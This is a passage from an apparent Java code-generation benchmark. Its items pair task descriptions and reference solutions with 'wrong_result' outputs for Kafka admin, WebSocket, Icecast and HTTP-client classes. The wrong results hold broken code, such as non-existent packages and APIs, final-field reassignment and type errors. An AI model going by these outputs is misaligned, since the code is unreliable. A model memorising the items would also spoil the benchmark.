{\n        LOG.warn(\"Cannot retrieve configuration for topic '{}'.\", topic, ee);\n      }\n    } catch (InterruptedException ie) {\n      LOG.debug(\"Interrupted while getting configuration for topic '{}'.\", topic, ie);\n    }\n\n    if (topicConfig != null) {\n      return convertConfigToProperties(topicConfig);\n    } else {\n      LOG.warn(\"The configuration for topic '{}' could not be retrieved, returning empty Properties instance.\", topic);\n      return new Properties();\n    }\n  }\n\n  public Map<String, Properties> topicConfigs(Set<String> topics) {\n    Map<ConfigResource, KafkaFuture<Config>> topicConfigs;\n    topicConfigs = _adminClient.describeConfigs(\n            topics.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n    ).values();\n\n    Map<String, Properties> propsMap = new HashMap<>();\n    if (topicConfigs != null) {\n      for (Map.Entry<ConfigResource, KafkaFuture<Config>> entry : topicConfigs.entrySet()) {\n        try {\n          Config config = entry.getValue().get();\n          propsMap.put(entry.getKey().name(), convertConfigToProperties(config));\n        } catch (ExecutionException ee) {\n          if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n            LOG.warn(\"Failed to retrieve config for topics due to describeConfigs request timing out.\");\n            break;\n          } else {\n            LOG.debug(\"Cannot retrieve config for topic {}.\", entry.getKey().name(), ee);\n          }\n        } catch (InterruptedException ie) {\n          LOG.debug(\"Interrupted while getting config for topic {}.\", entry.getKey().name(), ie);\n        }\n      }\n    }\n    return propsMap;\n  }\n\n  public Map<String, Properties> allTopicConfigs() {\n    LOG.debug(\"Requesting configurations for all topics\");\n    Set<String> topicNames = null;\n    try {\n      topicNames = _adminClient.listTopics().names().get();\n    } catch (InterruptedException | ExecutionException e) {\n      LOG.warn(\"Unable to obtain list of all topic names from the Kafka Cluster\");\n    }\n\n    if (topicNames == null) {\n      return Collections.emptyMap();\n    } else {\n      return topicConfigs(topicNames);\n    }\n  }\n\n  protected static Properties convertConfigToProperties(Config config) {\n    Properties props = new Properties();\n    for (ConfigEntry entry : config.entries()) {\n      if (entry.name() == null || entry.value() == null) {\n        continue;\n      }\n      props.put(entry.name(), entry.value());\n    }\n    return props;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "wrong_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.common.config.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaAdminTopicConfigProvider {\n    private final Properties _clusterConfigs;\n    private final AdminClient _adminClient;\n    private static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n    private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n\n    public KafkaAdminTopicConfigProvider(Properties clusterConfigs, AdminClient adminClient) {\n        this._clusterConfigs = clusterConfigs;\n        this._adminClient = adminClient;\n    }\n\n    public Properties topicConfigs(String topic) {\n        try {\n            ConfigResource configResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n            DescribeConfigsResult describeConfigsResult = _adminClient.describeConfigs(Collections.singletonList(configResource));\n            KafkaFuture<Map<ConfigResource, Config>> future = describeConfigsResult.all();\n            Map<ConfigResource, Config> configsMap = future.get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), java.util.concurrent.TimeUnit.MILLISECONDS);\n            Config config = configsMap.get(configResource);\n            return convertConfigToProperties(config);\n        } catch (Exception e) {\n            LOG.warn(\"Failed to retrieve configurations for topic '{}': {}\", topic, e.getMessage());\n            return new Properties();\n        }\n    }\n\n    public Map<String, Properties> topicConfigs(Set<String> topics) {\n        Map<String, Properties> result = new HashMap<>();\n        if (topics == null || topics.isEmpty()) {\n            return result;\n        }\n        try {\n            List<ConfigResource> configResources = new ArrayList<>();\n            for (String topic : topics) {\n                configResources.add(new ConfigResource(ConfigResource.Type.TOPIC, topic));\n            }\n            DescribeConfigsResult describeConfigsResult = _adminClient.describeConfigs(configResources);\n            KafkaFuture<Map<ConfigResource, Config>> future = describeConfigsResult.all();\n            Map<ConfigResource, Config> configsMap = future.get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), java.util.concurrent.TimeUnit.MILLISECONDS);\n            for (Map.Entry<ConfigResource, Config> entry : configsMap.entrySet()) {\n                ConfigResource resource = entry.getKey();\n                if (resource.type() == ConfigResource.Type.TOPIC) {\n                    String topic = resource.name();\n                    Properties properties = convertConfigToProperties(entry.getValue());\n                    result.put(topic, properties);\n                }\n            }\n        } catch (Exception e) {\n            LOG.warn(\"Failed to retrieve configurations for topics {}: {}\", topics, e.getMessage());\n        }\n        return result;\n    }\n\n    public Map<String, Properties> allTopicConfigs() {\n        Map<String, Properties> result = new HashMap<>();\n        try {\n            DescribeConfigsResult describeConfigsResult = _adminClient.describeConfigs(Collections.singletonList(new ConfigResource(ConfigResource.Type.CLUSTER, \"cluster\")));\n            KafkaFuture<Map<ConfigResource, Config>> future = describeConfigsResult.all();\n            Map<ConfigResource, Config> configsMap = future.get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), java.util.concurrent.TimeUnit.MILLISECONDS);\n            Config config = configsMap.get(new ConfigResource(ConfigResource.Type.CLUSTER, \"cluster\"));\n            if (config != null) {\n                Properties properties = convertConfigToProperties(config);\n                result.put(\"cluster\", properties);\n            }\n        } catch (Exception e) {\n            LOG.warn(\"Failed to retrieve cluster configurations: {}\", e.getMessage());\n        }\n        return result;\n    }\n\n    private Properties convertConfigToProperties(Config config) {\n        Properties properties = new Properties();\n        if (config == null) {\n            return properties;\n        }\n        for (Map.Entry<String, Config.ConfigEntry> entry : config.entries().entrySet()) {\n            String key = entry.getKey();\n            String value = entry.getValue().value();\n            if (value != null) {\n                properties.put(key, value);\n            }\n        }\n        return properties;\n    }\n}"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "wrong_result": "```java\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.config.ConfigException;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.apache.kafka.admin.Admin;\nimport org.apache.kafka.admin.AdminClientConfig;\nimport org.apache.kafka.admin.DescribeTopicsResult;\nimport org.apache.kafka.admin.TopicDescription;\nimport org.apache.kafka.common.TopicPartitionInfo;\n\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin implements AutoCloseable {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) throws KafkaException {\n        try (Admin admin = createAdmin()) {\n            DescribeTopicsResult describeTopicsResult = admin.describeTopics(List.of(topicNames));\n            Map<String, TopicDescription> topicDescriptions = new HashMap<>();\n            for (String topicName : topicNames) {\n                try {\n                    topicDescriptions.put(topicName, describeTopicsResult.topicMetadata(topicName).get(operationTimeout, TimeUnit.SECONDS));\n                } catch (InterruptedException | ExecutionException | TimeoutException e) {\n                    throw new KafkaException(\"Failed to describe topic: \" + topicName, e);\n                }\n            }\n            return topicDescriptions;\n        } catch (Exception e) {\n            throw new KafkaException(\"Failed to describe topics\", e);\n        }\n    }\n\n    protected Admin createAdmin() throws KafkaException {\n        try {\n            return Admin.create(configs);\n        } catch (ConfigException e) {\n            throw new KafkaException(\"Invalid admin configuration\", e);\n        }\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    @Override\n    public void close() throws Exception {\n        // Close is handled in the describeTopics method using try-with-resources\n    }\n}\n```"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class SSLWebSocketClient extends WebSocketClient {\n    private String endpointIdentificationAlgorithm;\n    private boolean onSSLError;\n    private boolean onOpen;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) {\n        super(new URI(\"wss://\" + address + \":\" + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n        this.onSSLError = false;\n        this.onOpen = false;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n        System.out.println(\"WebSocket connection opened: \" + handshakedata.getHttpStatusMessage());\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"WebSocket connection closed: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof SSLException) {\n            this.onSSLError = true;\n            System.err.println(\"SSL error occurred: \" + ex.getMessage());\n        } else {\n            System.err.println(\"Error occurred: \" + ex.getMessage());\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(this.endpointIdentificationAlgorithm);\n    }\n}"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create a Java class that implements metadata updates for an Icecast broadcast server using HTTP client functionality.\n\nClass Description: The IcecastBroadcastMetadataUpdater class is responsible for sending metadata updates to an Icecast server via HTTP requests. It constructs the appropriate URL, handles authentication, and manages the HTTP communication asynchronously. The class implements the IBroadcastMetadataUpdater interface and handles character encoding, error logging, and connection status tracking.\n\nAttributes:\n- mLog: Logger - Logger instance for error and status logging\n- mHttpClient: HttpClient - HTTP client instance for making requests\n- mIcecastConfiguration: IcecastConfiguration - Configuration object containing server details (host, port, mount point, credentials)\n- mConnectionLoggingSuppressed: boolean - Flag to prevent duplicate connection error logs\n\nMethods:\n- IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) -> void - Constructor that initializes the class with Icecast server configuration\n- update(IdentifierCollection identifierCollection) -> void - Main method that constructs and sends the metadata update request to the Icecast server. Takes an IdentifierCollection containing metadata information as input. Handles URL construction, encoding, and asynchronous request execution.",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.IBroadcastMetadataUpdater;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastConfiguration;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastMetadata;\nimport io.github.dsheirer.identifier.IdentifierCollection;\nimport io.github.dsheirer.properties.SystemProperties;\nimport io.github.dsheirer.util.ThreadPool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater\n{\n    private final static Logger mLog = LoggerFactory.getLogger(IcecastBroadcastMetadataUpdater.class);\n    private final static String UTF8 = \"UTF-8\";\n    private HttpClient mHttpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();\n    private IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed = false;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration)\n    {\n        mIcecastConfiguration = icecastConfiguration;\n    }\n\n    public void update(IdentifierCollection identifierCollection)\n    {\n        if(mIcecastConfiguration.hasInline())\n        {\n            return;\n        }\n\n        StringBuilder sb = new StringBuilder();\n\n        try\n        {\n            sb.append(\"http://\");\n            sb.append(mIcecastConfiguration.getHost());\n            sb.append(\":\");\n            sb.append(mIcecastConfiguration.getPort());\n            sb.append(\"/admin/metadata?mode=updinfo&mount=\");\n            sb.append(URLEncoder.encode(mIcecastConfiguration.getMountPoint(), UTF8));\n            sb.append(\"&charset=UTF%2d8\");\n            sb.append(\"&song=\").append(URLEncoder.encode(IcecastMetadata.getTitle(identifierCollection), UTF8));\n        }\n        catch(UnsupportedEncodingException uee)\n        {\n            mLog.error(\"Error encoding metadata information to UTF-8\", uee);\n            sb = null;\n        }\n\n        if(sb != null)\n        {\n            final String metadataUpdateURL = sb.toString();\n            URI uri = URI.create(metadataUpdateURL);\n\n            ThreadPool.CACHED.submit(new Runnable()\n            {\n                @Override\n                public void run()\n                {\n                    try\n                    {\n                        HttpRequest request = HttpRequest.newBuilder()\n                            .uri(uri)\n                            .header(\"Authorization\", mIcecastConfiguration.getBase64EncodedCredentials())\n                            .header(\"User-Agent\", SystemProperties.getInstance().getApplicationName())\n                            .GET()\n                            .build();\n\n                        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n                        if(response != null)\n                        {\n                            if(response.statusCode() == 200)\n                            {\n                                mConnectionLoggingSuppressed = false;\n                            }\n                            else if(!mConnectionLoggingSuppressed)\n                            {\n                                mLog.info(\"Error submitting Icecast 2 Metadata update to URL [\" + metadataUpdateURL +\n                                    \"] HTTP Response Code [\" + response.statusCode() + \"] Body [\" + response.body() + \"]\");\n                                mConnectionLoggingSuppressed = true;\n                            }\n                        }\n                    }\n                    catch(IOException | InterruptedException e)\n                    {\n                        mLog.error(\"Error submitting Icecast metadata update\", e);\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater {\n    private final Logger mLog;\n    private final HttpClient mHttpClient;\n    private final IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) {\n        mLog = new Logger(\"IcecastBroadcastMetadataUpdater\");\n        mHttpClient = HttpClient.newHttpClient();\n        mIcecastConfiguration = icecastConfiguration;\n        mConnectionLoggingSuppressed = false;\n    }\n\n    @Override\n    public void update(IdentifierCollection identifierCollection) {\n        try {\n            String metadata = buildMetadataString(identifierCollection);\n            String url = buildUrl();\n            HttpRequest request = buildHttpRequest(url, metadata);\n            sendRequestAsync(request);\n        } catch (Exception e) {\n            mLog.error(\"Failed to update Icecast metadata: \" + e.getMessage());\n        }\n    }\n\n    private String buildMetadataString(IdentifierCollection identifierCollection) {\n        StringBuilder metadataBuilder = new StringBuilder();\n        for (Map.Entry<String, String> entry : identifierCollection.getMetadata().entrySet()) {\n            metadataBuilder.append(entry.getKey()).append(\"=\").append(entry.getValue()).append(\"&\");\n        }\n        return metadataBuilder.toString();\n    }\n\n    private String buildUrl() {\n        String host = mIcecastConfiguration.getHost();\n        int port = mIcecastConfiguration.getPort();\n        String mountPoint = mIcecastConfiguration.getMountPoint();\n        return \"http://\" + host + \":\" + port + \"/\" + mountPoint;\n    }\n\n    private HttpRequest buildHttpRequest(String url, String metadata) {\n        String encodedMetadata = encodeMetadata(metadata);\n        return HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n                .header(\"Authorization\", \"Basic \" + getBase64Credentials())\n                .POST(HttpRequest.BodyPublishers.ofString(encodedMetadata))\n                .build();\n    }\n\n    private String encodeMetadata(String metadata) {\n        return metadata.getBytes(StandardCharsets.UTF_8);\n    }\n\n    private String getBase64Credentials() {\n        String credentials = mIcecastConfiguration.getUsername() + \":\" + mIcecastConfiguration.getPassword();\n        return java.util.Base64.getEncoder().encodeToString(credentials.getBytes(StandardCharsets.UTF_8));\n    }\n\n    private void sendRequestAsync(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenAccept(response -> {\n                    if (response.statusCode() != 200) {\n                        handleErrorResponse(response);\n                    }\n                })\n                .exceptionally(ex -> {\n                    handleException(ex);\n                    return null;\n                });\n    }\n\n    private void handleErrorResponse(HttpResponse<String> response) {\n        if (!mConnectionLoggingSuppressed) {\n            mLog.warn(\"Icecast metadata update failed with status code: \" + response.statusCode());\n            mConnectionLoggingSuppressed = true;\n        }\n    }\n\n    private void handleException(Throwable ex) {\n        if (!mConnectionLoggingSuppressed) {\n            mLog.error(\"An error occurred while updating Icecast metadata: \" + ex.getMessage());\n            mConnectionLoggingSuppressed = true;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using Java's HttpClient for synchronous and asynchronous HTTP operations including GET, PUT, HEAD, and DELETE requests.\n\nClass Description: The BlobHttpClient class provides a wrapper around Java's HttpClient to perform common HTTP operations. It handles client initialization, request construction, and response processing with both synchronous and asynchronous options.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HTTP client instance used for all requests\n\nMethods:\nsetup(): [void] - Initializes the HttpClient instance with default configuration (follows normal redirects)\ncloseClient(): [void] - Closes the HttpClient instance and releases resources\nput: [HttpResponse<String>]([URI uri, String body]) -> [HttpResponse<String>] - Sends a synchronous PUT request with the provided body to the specified URI and returns the string response\nget: [HttpResponse<String>]([URI uri]) -> [HttpResponse<String>] - Sends a synchronous GET request to the specified URI and returns the string response\ngetAsync: [CompletableFuture<HttpResponse<String>>]([URI uri]) -> [CompletableFuture<HttpResponse<String>>] - Sends an asynchronous GET request to the specified URI and returns a CompletableFuture of the response\nhead: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous HEAD request to the specified URI and returns a response without body\ndelete: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous DELETE request to the specified URI and returns a response without body",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutionException;\n\npublic class BlobHttpClient {\n\n    protected HttpClient httpClient;\n\n    public void setup() throws ExecutionException, InterruptedException {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .build();\n    }\n\n    public void closeClient() throws Exception {\n        httpClient.close();\n    }\n\n    protected HttpResponse<String> put(URI uri, String body) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .PUT(BodyPublishers.ofString(body))\n            .build();\n        HttpResponse<String> response = httpClient.send(request, BodyHandlers.ofString());\n        return response;\n    }\n\n    protected HttpResponse<String> get(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    protected CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.sendAsync(request, BodyHandlers.ofString());\n    }\n\n    protected HttpResponse<Void> head(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).HEAD().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n\n    protected HttpResponse<Void> delete(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).DELETE().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class BlobHttpClient {\n    private final HttpClient httpClient;\n\n    public BlobHttpClient() {\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public void setup() {\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    public HttpResponse<String> put(URI uri, String body) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .PUT(HttpRequest.BodyPublishers.ofString(body))\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> get(URI uri) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<Void> head(URI uri) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .HEAD()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofVoid());\n    }\n\n    public HttpResponse<Void> delete(URI uri) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .DELETE()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofVoid());\n    }\n}"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, disconnections, and errors using Java EE WebSocket API.\n\nClass Description: The WebsocketServerEndpoint class is a WebSocket server endpoint that manages client connections and message handling. It uses annotations to define WebSocket lifecycle events and maintains a map of message handlers for different message types.\n\nAttributes:\n- logger: Logger - Used for logging server events and errors\n- HANDLERS: Map<String, MessageHandler> - Static map storing message handlers keyed by message type\n\nMethods:\n- onOpen(Session session, EndpointConfig config) -> void - Handles new client connections, authenticates using access token from request parameters\n- onMessage(Session session, String message) -> void - Processes incoming messages from clients, delegates to appropriate message handler\n- onClose(Session session, CloseReason closeReason) -> void - Handles client disconnections, cleans up session\n- onError(Session session, Throwable throwable) -> void - Handles WebSocket communication errors\n- getMessageClass(MessageHandler handler) -> Class<? extends Message> - Helper method to determine message class type from handler's generic type information",
    "Canonical_solution": "import cn.iocoder.springboot.lab25.springwebsocket.handler.MessageHandler;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.AuthRequest;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.Message;\nimport cn.iocoder.springboot.lab25.springwebsocket.util.WebSocketUtil;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.aop.framework.AopProxyUtils;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@ServerEndpoint(\"/\")\npublic class WebsocketServerEndpoint {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"[onOpen][session({}) connected]\", session);\n        List<String> accessTokenValues = session.getRequestParameterMap().get(\"accessToken\");\n        String accessToken = !CollectionUtils.isEmpty(accessTokenValues) ? accessTokenValues.get(0) : null;\n        AuthRequest authRequest = new AuthRequest().setAccessToken(accessToken);\n        MessageHandler<AuthRequest> messageHandler = HANDLERS.get(AuthRequest.TYPE);\n        if (messageHandler == null) {\n            logger.error(\"[onOpen][Auth message type, no message handler found]\");\n            return;\n        }\n        messageHandler.execute(session, authRequest);\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"[onMessage][session({}) received message({})]\", session, message);\n        try {\n            JSONObject jsonMessage = JSON.parseObject(message);\n            String messageType = jsonMessage.getString(\"type\");\n            MessageHandler messageHandler = HANDLERS.get(messageType);\n            if (messageHandler == null) {\n                logger.error(\"[onMessage][Message type({}) has no handler]\", messageType);\n                return;\n            }\n            Class<? extends Message> messageClass = getMessageClass(messageHandler);\n            Message messageObj = JSON.parseObject(jsonMessage.getString(\"body\"), messageClass);\n            messageHandler.execute(session, messageObj);\n        } catch (Throwable throwable) {\n            logger.error(\"[onMessage][session({}) error processing message]\", session, throwable);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"[onClose][session({}) disconnected. Reason: {}]\", session, closeReason);\n        WebSocketUtil.removeSession(session);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"[onError][session({}) error occurred]\", session, throwable);\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Class<?> targetClass = 